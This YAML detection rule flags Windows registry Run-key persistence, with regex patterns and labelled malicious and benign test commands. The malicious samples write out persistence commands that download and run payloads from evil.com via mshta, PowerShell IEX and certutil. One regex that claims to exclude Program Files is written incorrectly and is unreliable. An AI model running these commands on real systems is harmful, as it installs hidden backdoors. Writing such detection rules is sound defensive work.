name: medium-21-registry-run
severity: medium
description: >
  Detects registry Run key modifications. Common persistence technique for Windows malware.

patterns:
  - name: registry-run-with-suspicious-tools
    pattern: (?i)reg(\.exe)?\s+add.*(HKCU|HKLM|HKEY_CURRENT_USER|HKEY_LOCAL_MACHINE).*\\(Run|RunOnce).*/d.*['\"]?(powershell|cmd|mshta|wscript|cscript|certutil|bitsadmin|rundll32)
    description: Detects Run key with suspicious tools

  - name: registry-run-with-temp-paths
    pattern: (?i)reg(\.exe)?\s+add.*(HKCU|HKLM|HKEY_CURRENT_USER|HKEY_LOCAL_MACHINE).*\\(Run|RunOnce).*/d.*(Temp|AppData|Users.*Public|ProgramData)
    description: Detects Run key with temp/suspicious paths

  - name: registry-run-with-url
    pattern: (?i)reg(\.exe)?\s+add.*(HKCU|HKLM|HKEY_CURRENT_USER|HKEY_LOCAL_MACHINE).*\\(Run|RunOnce).*/d.*(http|https|ftp)://
    description: Detects Run key with URLs

  - name: registry-run-with-root-exe
    pattern: (?i)reg(\.exe)?\s+add.*(HKCU|HKLM|HKEY_CURRENT_USER|HKEY_LOCAL_MACHINE).*\\(Run|RunOnce).*/d.*['\"]C:\\[^\\Program][^\\]*\.exe
    description: Detects Run key with executable in C root (not Program Files)

  - name: registry-run-simple-path
    pattern: (?i)reg(\.exe)?\s+add.*(HKCU|HKLM|HKEY_CURRENT_USER|HKEY_LOCAL_MACHINE).*\\(Run|RunOnce).*/d.*C:\\[^\\s]*\.exe
    description: Detects Run key with any suspicious executable path

malicious:
  - "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Evil /d \"powershell -enc SGFja2Vk\""
  - "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce /v Dropper /d \"C:\\Temp\\dropper.exe\""
  - "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Malware /d \"cmd /c C:\\malware.bat\""
  - "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Trojan /d \"mshta http://evil.com/payload.hta\""
  - "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /d \"wscript C:\\Users\\Public\\evil.vbs\""
  - "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Persistence /d \"powershell -w hidden -c IEX(IWR http://evil.com/p.ps1)\""
  - "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce /v ClickFix /d \"certutil -urlcache -f http://evil.com/mal.exe mal.exe\""
  - "reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /d \"C:\\Windows\\Temp\\update.exe\""
  - "reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Loader /d \"C:\\Users\\victim\\AppData\\Local\\Temp\\loader.exe\""
  - "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Shell /d \"powershell -ep bypass -w hidden C:\\Temp\\backdoor.ps1\""
  - "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce /v Install /d \"cmd /c C:\\ProgramData\\installer.bat\""
  - "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Startup /d \"mshta javascript:eval('malicious')\""
  - "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Service /d \"wscript //B C:\\Windows\\Temp\\hidden.vbs\""

benign:
  - "reg add HKCU\\Software\\MyApp\\Settings /v LastRun /d \"2024-01-01\""
  - "reg add HKLM\\System\\CurrentControlSet\\Services\\MyService /v Start /t REG_DWORD /d 2"
  - "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
  - "reg add HKCU\\Environment /v PATH /d \"C:\\Program Files\\MyApp\""
  - "reg delete HKCU\\Software\\OldApp"
  - "reg add HKLM\\Software\\Policies\\Microsoft\\Windows\\CurrentVersion /v DisableAntiSpyware /t REG_DWORD /d 0"
  - "reg add HKCU\\Console /v FaceName /d \"Consolas\""
  - "reg add HKLM\\Software\\MyCompany\\Product /v Version /d \"1.0\""
  - "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Themes /v CurrentTheme /d \"C:\\Windows\\Resources\\Theme.theme\""
  - "reg add HKLM\\System\\CurrentControlSet\\Control\\TimeZoneInformation /v StandardName /d \"Pacific Standard Time\""
  - "reg export HKCU\\Software\\MyApp backup.reg"
  - "reg import settings.reg"
  - "reg add HKCU\\Software\\Classes\\.txt /v \"Content Type\" /d \"text/plain\""
  - "reg add HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion /v RegisteredOwner /d \"Company Name\""
  - "reg add HKCU\\Control Panel\\Desktop /v Wallpaper /d \"C:\\Pictures\\wallpaper.jpg\""
